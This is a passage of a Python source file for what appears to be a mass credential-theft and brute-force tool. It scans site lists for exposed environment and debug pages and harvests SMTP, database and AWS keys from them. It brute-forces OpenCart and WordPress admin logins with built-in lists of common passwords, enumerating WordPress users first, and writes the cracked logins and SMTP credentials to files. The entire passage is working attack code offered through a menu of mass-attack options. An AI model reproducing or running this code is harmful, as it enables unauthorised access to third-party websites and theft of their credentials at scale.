                    with open(os.path.join('envs', f'{plainURL}_debug.html'), 'w', encoding='utf-8') as output:
                        output.write(f'{r.text}')

                    DB_DEBUG(r.text)
                    SMTP_DEBUG(r.text)
                    AWS_DEBUG(r.text)
                    AWS_DEBUG1(r.text)
            except:
                pass
    

        def checkURL(url):

            try:
                r = requests.get(f'http://{url}/', allow_redirects=False, timeout=10, verify=False, headers=headers)
                if r.status_code == 200:
                    getENV1(r.url.strip('/'), url)
                    getENV(r.url.strip('/'), url)
                if r.status_code == 301:
                    r = requests.get(f'{r.headers["Location"]}', verify=False, timeout=10, allow_redirects=False, headers=headers)
                    if r.status_code == 200:
                        getENV1(r.url.strip('/'), url)
                        getENV(r.url.strip('/'), url)
                    else:
                        r = requests.get(f'http://www.{url}/', verify=False, timeout=10, allow_redirects=False, headers=headers)
                        if r.status_code == 200:
                            getENV1(r.url.strip('/'), url)
                            getENV(r.url.strip('/'), url)
                        else:
                            r = requests.get(f'https://www.{url}/', verify=False, timeout=10, allow_redirects=False, headers=headers)
                            if r.status_code == 200:
                                getENV1(r.url.strip('/'), url)
                                getENV(r.url.strip('/'), url)
                            else:
                                getENV1(f'https://{url}', url)
                                getENV(f'https://{url}', url)
                if r.status_code == 302:
                    try:
                        r = requests.get(r.headers['Location'], verify=False, timeout=10, allow_redirects=False, headers=headers)
                        if r.status_code == 200:
                            getENV(r.url.strip('/'), url)
                            getENV1(r.url.strip('/'), url)
                        if r.status_code == 302:
                            url = r.headers['Location']
                            r = requests.get(url.replace('www.', ''), verify=False, timeout=10, allow_redirects=False, headers=headers)
                            if r.status_code == 200:
                                getENV(r.url.strip('/'), url)
                                getENV1(r.url.strip('/'), url)
                            else:
                                r = requests.get(url.replace('://', '://www.'), verify=False, timeout=10, allow_redirects=False, headers=headers)
                                if r.status_code == 200:
                                    getENV(r.url.strip('/'), url)
                                    getENV1(r.url.strip('/'), url)
                                else:
                                    getENV(f'http://{url}', url)
                                    getENV1(f'http://{url}', url)
                    except:
                        print("\033[31;1m[!] \033[37mCan't Connect to site.\033[0m")
            except:
                pass


        checkURL(url)

    def opencart(self, url):

        def crack(url):
            try:
                r = requests.get(f'{url}/admin/index.php', verify=False, timeout=10, allow_redirects=False, headers=headers)
                if r.status_code == 200:
                    keys = ['OpenCart', 'index.php?route=']
                    if any(key in r.text for key in keys):
                        passList = ['admin', 'admin123', 'admin1234', 'admin12345', 'admin123456', 'admin123567', 'admin123456789', '123456', '12345', '11111111111', '111111', '2222222', '88888888', '888888'
                        'admin@123', 'admin@1234', 'admin@12345', 'admin@123456', 'password1', '666666', '222222', 'administrator', 'Admin123', 'Admin1234', 'Admin@123', 'Admin@1234', 'Administrator', 'Administrator@123', 'password', 'passw0rd',
                        '1234567890', 'iloveyou', 'qw3rty', 'abcd1234', '11223344', 'q1w2e3r4t5', 'qwerty', 'p@$$w0rd', 'p@ssw0rd', 'Admin@123!@#']

                        for password in passList:
                            r = requests.post(f'{url}/admin/index.php', verify=False, timeout=10, allow_redirects=False,  files={'username': (None, 'admin'), 'password': (None, password)}, headers=headers)
                            print(f'{url} - admin:{password}')
                            if r.status_code == 302:
                                if 'user_token' in r.headers['Location']:
                                    print(f'\033[34;1m[*] \033[32mLogin success: \033[34m{url} \033[32m- \033[37madmin\033[32m:\033[37m{password}\033[0m')
                                    with open('scanner/opencart_cracked.txt', 'a+') as output:
                                        output.write(f'Login success: {r.url} - admin:{password}')
                                else:
                                    pass
            except:
                pass

        def verifyURL(url):
            r = requests.get(f'http://{url}/', allow_redirects=False, timeout=10, verify=False, headers=headers)
            if r.status_code == 200:
                crack(r.url.strip('/'))
            if r.status_code == 301:
                r = requests.get(f'{r.headers["Location"]}', verify=False, timeout=10, allow_redirects=False, headers=headers)
                if r.status_code == 200:
                    crack(r.url.strip('/'))
                else:
                    r = requests.get(f'http://www.{url}/', verify=False, timeout=10, allow_redirects=False, headers=headers)
                    if r.status_code == 200:
                        crack(r.url.strip('/'))
                    else:
                        r = requests.get(f'https://www.{url}/', verify=False, timeout=10, allow_redirects=False, headers=headers)
                        if r.status_code == 200:
                            crack(r.url.strip('/'))
        verifyURL(url)

    def wordpress(self, url):
        def login(url, userName):
            print(f'WordpressBruteforce - Checking site  - {url}')
            r = requests.get(f'{url}/wp-login.php', verify=False, timeout=10, allow_redirects=False, headers=headers)
            if r.status_code == 200:
                keys = ['action=lostpassword', 'user_login', 'WordPress']
                if any(key in r.text for key in keys):
                    h = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0',
                                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                                'Cookie': 'wordpress_test_cookie=WP+Cookie+check; humans_21909=1;'}

                    passList = ['admin', 'Admin@123!@#','admin123', 'admin@123', '123456', '12345', 'admin@1234', 'admin1234', 'password', 'Password', '666666', 'password1', '1234567890', 
                    'iloveyou', 'qw3rty', 'abcd1234', '11223344', 'q1w2e3r4t5', 'qwerty', 'p@$$w0rd', 'p@ssw0rd', 'admin123567', 'admin123456789', '11111111111', 
                    '111111', '2222222', '88888888', '888888', 'Admin@1234', 'Admin@123', '66666', '66666666', '7777777']

                    for passWord in passList:
                        data = {'log': userName,
                        'pwd': passWord,
                        'wp-submit': 'Log In',
                        'redirect_to': f'{url}/wp-admin/',
                        'testcookie': '1'}

                        r = requests.post(f'{url}/wp-login.php', verify=False, timeout=10, allow_redirects=False, headers=h, data=data)
                        print(f'{r.status_code} - {url} - {userName}:{passWord}')
                        if r.status_code == 302:
                            keys = [f'={userName.upper()}%', f'={userName.lower()}%']
                            if 'wordpress_' in r.headers['Set-Cookie']:
                                if any(key in r.headers['Set-Cookie'] for key in keys):
                                    print(f'\033[34;1m[*] \033[32;1mSuccess login - \033[37m{url} \033[32m- \033[37m{userName}\033[32m:\033[37m{passWord}\033[0m')
                                    with open('scanner/wp_logins.txt', 'a+') as output:
                                        output.write(f'Success login - {url} - {userName}:{passWord}\n')
                                    break
                else:
                    pass

        def getUser(url):
            r = requests.get(f'{url}/wp-json/wp/v2/users', verify=False, timeout=10, allow_redirects=False, headers=headers)
            if r.ok:
                if 'slug' in r.text:
                    print(url)
                    slug = r.json()[0]['slug']
                    login(url, slug)
                else:
                    slug = 'admin'
                    login(url, slug)
            if r.status_code == 401:
                print(url)
                slug = 'admin'
                login(url, slug)

        def verifyURL(url):
            r = requests.get(f'http://{url}/', allow_redirects=False, timeout=10, verify=False, headers=headers)
            if r.status_code == 200:
                getUser(r.url.strip('/'))
            if r.status_code == 301:
                r = requests.get(f'{r.headers["Location"]}', verify=False, timeout=10, allow_redirects=False, headers=headers)
                if r.status_code == 200:
                    getUser(r.url.strip('/'))
                else:
                    r = requests.get(f'http://www.{url}/', verify=False, timeout=10, allow_redirects=False, headers=headers)
                    if r.status_code == 200:
                        getUser(r.url.strip('/'))
                    else:
                        r = requests.get(f'https://www.{url}/', verify=False, timeout=10, allow_redirects=False, headers=headers)
                        if r.status_code == 200:
                            getUser(r.url.strip('/'))
            if r.status_code == 302:
                r = requests.get(r.headers['Location'], verify=False, timeout=10, allow_redirects=False, headers=headers)
                if r.status_code == 200:
                    getUser(r.url)
        
        verifyURL(url)

    def extract(self, argFile):
        final = []
        mail_host = []
        mail_port = []
        mail_user = []
        mail_pass = []
        for i in argFile:
            try:
                if 'MAIL' in i:
                    if 'MAILHOST' in i:
                        mailHost = i.split(':')[1].strip()
                        mail_host.append(mailHost)
                    if 'MAILPORT' in i:
                        mailPort = i.split(':')[1].strip()
                        mail_port.append(mailPort)
                    if 'MAILUSER' in i:
                        mailUser = i.split(':')[1].strip()
                        mail_user.append(mailUser)
                    if 'MAILPASS' in i:
                        maillPass = i.split(':')[1].strip()
                        mail_pass.append(maillPass)
            except:
                continue

        for i in range(len(mail_host)):
            try:
                add_data = {}
                add_data['MAILHOST'] = mail_host[i]
                add_data['MAILPORT'] = mail_port[i]
                add_data['MAILUSER'] = mail_user[i]
                add_data['MAILPASS'] = mail_pass[i]
                final.append(add_data)
            except:
                continue
        
        for SMTPS in final:
            if SMTPS['MAILHOST'] != '' and SMTPS['MAILHOST'] != 'localhost' and SMTPS['MAILHOST'] != '127.0.0.1' and SMTPS['MAILHOST'] != 'null' and 'mailtrap' not in SMTPS['MAILHOST']:
                if SMTPS['MAILPORT'] != '' and SMTPS['MAILPORT'] != 'null':
                    if SMTPS['MAILUSER'] != '' and SMTPS['MAILUSER'] != 'null':
                        if SMTPS['MAILPASS'] != '' and SMTPS['MAILPASS'] != 'null':
                            print(f'{SMTPS["MAILHOST"]}|{SMTPS["MAILPORT"]}|{SMTPS["MAILUSER"]}|{SMTPS["MAILPASS"]}')
                            with open('scanner/smtps_to_check.txt', 'a+') as output:
                                output.write(f'{SMTPS["MAILHOST"]}|{SMTPS["MAILPORT"]}|{SMTPS["MAILUSER"]}|{SMTPS["MAILPASS"]}\n')
            else:
                pass


if __name__ == '__main__':
    bot = Bot()

    os.system('clear')
    banner()
    print(Fore.RED + '[+] Choose the type :-')
    print()
    print(Fore.YELLOW + "    [1] MASS EXTRACT SMTPS/SENDGRID API/AWS KEYS")
    print(Fore.YELLOW + "    [2] MASS SENDGRID APIKEY CHECKER")
    print(Fore.YELLOW + "    [3] Mass SMTP CHECKER")
    print(Fore.YELLOW + "    [4] Mass EMAIL FILTER")
    print(Fore.YELLOW + "    [5] Mass ENV SCANNER")
    print(Fore.YELLOW + "    [6] Mass Opencart Bruteforce")
    print(Fore.YELLOW + "    [7] Mass Wordpress Bruteforce")
    print(Fore.YELLOW + "    [8] Exit")
    print()
    inp = int(input(Fore.CYAN + "select >> "))
    if inp == 1:
        inpFile  = input("\033[34mEnter List :\033[32m ")
        with open(inpFile) as file_:
            argFile = file_.read().splitlines()
            bot.ENVExtractor(argFile)
    if inp == 2:
        inpFile = input("\033[34mEnter your List :\033[32m ")
        threads = []
        with open(inpFile) as file_:
            argFile = file_.read().splitlines()
        with ThreadPoolExecutor(max_workers=15) as executor:
            for data in argFile:
                threads.append(executor.submit(bot.sendGridCheck, data))
    if inp == 3:
        inpFile = input("\033[34mEnter your List :\033[32m ")
        inpEmail = input("Enter your Email : ")
        threads = []
        with open(inpFile) as smtps:
            argFile = smtps.read().splitlines()
        with ThreadPoolExecutor(max_workers=15) as executor:
            for data in argFile:
                threads.append(executor.submit(bot.smtpChecker, data, inpEmail))
    if inp == 4:
        inpFile = input("\033[34mEnter your List :\033[32m ")
        threads = []
        with open(inpFile) as emails:
            argFile = emails.read().splitlines()
        with ThreadPoolExecutor(max_workers=15) as executor:
            for data in argFile:
                 threads.append(executor.submit(bot.mailExtract, data))
    if inp == 5:
        inpFile = input("\033[34mEnter your url list :\033[32m ")
        threads = []
        with open(inpFile) as urlList:
            argFile = urlList.read().splitlines()
        with ThreadPoolExecutor(max_workers=20) as executor:
            for data in argFile:
                threads.append(executor.submit(bot.envScanner, data))
    if inp == 6:
        inpFile = input("\033[34mEnter your url list :\033[32m ")
        threads = []
        with open(inpFile) as urlList:
            argFile = urlList.read().splitlines()
        with ThreadPoolExecutor(max_workers=20) as executor:
            for data in argFile:
                threads.append(executor.submit(bot.opencart, data))
    if inp == 7:
        inpFile = input("\033[34mEnter your url list :\033[32m ")
        threads = []
        with open(inpFile) as urlList:
            argFile = urlList.read().splitlines()
        with ThreadPoolExecutor(max_workers=20) as executor:
            for data in argFile:
                threads.append(executor.submit(bot.wordpress, data))

    if inp == 1337:
        inpFile = input("\033[34mEnter your url list :\033[32m ")
        with open(inpFile) as file_:
            argFile = file_.read().splitlines()
        bot.extract(argFile)